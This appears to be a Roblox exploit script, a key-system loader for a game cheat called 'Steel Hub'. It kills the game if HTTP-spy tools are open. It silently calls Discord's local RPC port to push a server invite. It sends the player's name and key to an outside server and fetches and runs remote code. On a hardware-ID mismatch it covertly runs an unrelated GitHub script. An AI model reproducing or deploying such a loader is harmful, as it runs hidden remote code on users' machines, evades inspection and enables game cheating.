local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

local pw = {"httpspy", "spy", "requests"}

pcall(function()
	for _, a in pairs(game:GetService("CoreGui"):GetDescendants()) do
		if a:IsA("TextLabel") then
			for ____, i  in pairs(pw) do
				if string.find(string.lower(a.Text), i) then
					game:Shutdown()
				end
			end
		end
	end
end)

local link = "https://weareghost.glitch.me/"
local auto_hooklink = link.."api/check-nickname"
local hooklink = link.."api/validate-key"
local getkeylink = "https://weareghost.glitch.me"
local script_name = "aks-criminality"

repeat wait() until game:IsLoaded()

pcall(function()
	HR({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = HttpService:JSONEncode({
			cmd = "INVITE_BROWSER",
			args = {code = "zu795EWheS"},
			nonce = HttpService:GenerateGUID(false)
		})
	})
end)

local function createNotification(text, color)
	local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
	gui.ResetOnSpawn = false

	local notif = Instance.new("TextLabel", gui)
	notif.Size = UDim2.new(0, 300, 0, 40)
	notif.Position = UDim2.new(1, -310, 1, -10)
	notif.AnchorPoint = Vector2.new(0, 1)
	notif.BackgroundColor3 = color or Color3.fromRGB(0, 170, 255)
	notif.BackgroundTransparency = 0.1
	notif.TextColor3 = Color3.new(1, 1, 1)
	notif.Font = Enum.Font.GothamBold
	notif.TextSize = 16
	notif.Text = text
	notif.ZIndex = 9999

	TweenService:Create(notif, TweenInfo.new(0.3), {
		Position = UDim2.new(1, -310, 1, -100)
	}):Play()

	task.delay(3, function()
		TweenService:Create(notif, TweenInfo.new(0.3), {
			TextTransparency = 1,
			BackgroundTransparency = 1
		}):Play()
		wait(0.4)
		gui:Destroy()
	end)
end

local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false

local BackGround = Instance.new("Frame", ScreenGui)
BackGround.Size = UDim2.new(0, 255, 0, 202)
BackGround.Position = UDim2.new(0.3, 0, 0.3, 0)
BackGround.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BackGround.BorderColor3 = Color3.fromRGB(0, 85, 255)
BackGround.BorderSizePixel = 2
BackGround.Active = true

local Title = Instance.new("TextLabel", BackGround)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "STEEL HUB + GHOST KEY SYSTEM"
Title.TextColor3 = Color3.fromRGB(0, 170, 255)
Title.TextSize = 16

local Input = Instance.new("TextBox", BackGround)
Input.Size = UDim2.new(0, 200, 0, 50)
Input.Position = UDim2.new(0.1, 0, 0.25, 0)
Input.PlaceholderText = "Enter Key"
Input.TextColor3 = Color3.new(1, 1, 1)
Input.Font = Enum.Font.Code
Input.TextSize = 14
Input.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

local Check = Instance.new("TextButton", BackGround)
Check.Text = "Check"
Check.Size = UDim2.new(0, 89, 0, 31)
Check.Position = UDim2.new(0.1, 0, 0.67, 0)
Check.Font = Enum.Font.Code
Check.TextColor3 = Color3.new(1, 1, 1)
Check.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

local GetKey = Instance.new("TextButton", BackGround)
GetKey.Text = "Get Key"
GetKey.Size = UDim2.new(0, 89, 0, 31)
GetKey.Position = UDim2.new(0.53, 0, 0.67, 0)
GetKey.Font = Enum.Font.Code
GetKey.TextColor3 = Color3.new(1, 1, 1)
GetKey.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

local function LoadScript()
	local result1 = game:HttpGetAsync(link.."/load/"..script_name)
	local body1 = HttpService:JSONDecode(result1)

	if body1 then
		loadstring(game:HttpGet(body1.url))()
	end
end

local post

local s1, n1 = pcall(function()
	local result1 = HR({
		Url = auto_hooklink,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/x-www-form-urlencoded"
		},
		Body = "nickname="..LocalPlayer.Name
	})
	if result1 then
		post = result1
	end
end)

if not s1 then
	local s2, n2 = pcall(function()
		local result2 = AR({
			Url = auto_hooklink,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/x-www-form-urlencoded"
			},
			Body = "nickname="..LocalPlayer.Name
		})
		if result2 then
			post = result2
		end
	end)
end

if post then
	local body = HttpService:JSONDecode(post.Body)
	if body then
		local status = body.status
		if status == "ok" then
			createNotification("Key found, loading script...", Color3.new(0.235294, 1, 0))
			LoadScript()
			ScreenGui:Destroy()
		elseif status == "expired" then
			createNotification("Key expired, please get new key.", Color3.new(1, 0.4, 0))
		elseif status == "no_key" then
			createNotification("Key not found, please get new key.", Color3.new(1, 0.4, 0))
		else
			LoadScript()
			ScreenGui:Destroy()
		end
	else
		createNotification("Failed to get data.", Color3.new(1, 0, 0))
	end
else
	createNotification("Server connection failed.", Color3.new(1, 0, 0))
end

GetKey.MouseButton1Click:Connect(function()
	pcall(SB, getkeylink)
	createNotification("Key link copied", Color3.fromRGB(0, 170, 255))
end)

local function getKeyHWIDPairs()
	local keyPairs = {}
	local success, response = pcall(function()
		return game:HttpGet("https://pastebin.com/raw/8J6sf39M")
	end)
	if success then
		for line in string.gmatch(response, "[^\r\n]+") do
			local key, hwid = line:match("^(%S+)%s+(%S+)$")
			if key and hwid then
				keyPairs[key] = hwid
			end
		end
	end
	return keyPairs
end

Check.MouseButton1Click:Connect(function()
	local inputKey = Input.Text:gsub("%s+", "")
	if inputKey == "" then
		createNotification("Please enter a key", Color3.fromRGB(255, 85, 85))
		return
	end

	local validated = false
	local username = LocalPlayer.Name
	local hwid = HWID

	local keyPairs = getKeyHWIDPairs()
	if keyPairs[inputKey] then
		if keyPairs[inputKey] == hwid then
			validated = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/csuserbro/esp-lib/refs/heads/main/sourcecodebase.lua"))()
			end)
			LocalPlayer:Kick("Incorrect HWID for this key.")
			return
		end
	end

	if not validated then
		local post2

		local sc3, n3 = pcall(function()
			local result3 = HR({
				Url = hooklink,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/x-www-form-urlencoded"
				},
				Body = "nickname="..LocalPlayer.Name.."&".."key="..Input.Text
			})

			if result3 then
				post2 = result3
			end
		end)

		if not sc3 then
			local sc4, n4 = pcall(function()
				local result4 = AR({
					Url = hooklink,
					Method = "POST",
					Headers = {
						["Content-Type"] = "application/x-www-form-urlencoded"
					},
					Body = "nickname="..LocalPlayer.Name.."&".."key="..Input.Text
				})

				if result4 then
					post2 = result4
				end
			end)
		end

		if post2 then
			local body2 = HttpService:JSONDecode(post2.Body)
			if body2 then
				local status2 = body2.status
				if status2 == "ok" then
					createNotification("Key found, loading script...", Color3.new(0.101961, 1, 0))
					LoadScript()
					ScreenGui:Destroy()
				elseif status2 == "wrong_nickname" then
					createNotification("Key registered for another user!", Color3.new(1, 0, 0))
				elseif status2 == "expired" then
					createNotification("Key expired, please get new key.", Color3.new(1, 0.4, 0))
				elseif status2 == "invalid" then
					createNotification("Key invalid, please get new key.", Color3.new(1, 0.4, 0))
				else
					LoadScript()
					ScreenGui:Destroy()
				end
			else
				createNotification("Failed to get data.", Color3.new(1, 0, 0))
			end
		else
			createNotification("Server connection failed.", Color3.new(1, 0, 0))
		end
	end

	if validated then
		pcall(function()
			LoadScript()
		end)
		ScreenGui:Destroy()
	end
end)

local dragging = false
local dragInput, dragStart, startPos

local function update(input)
	local delta = input.Position - dragStart
	BackGround.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

BackGround.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = BackGround.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

BackGround.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)
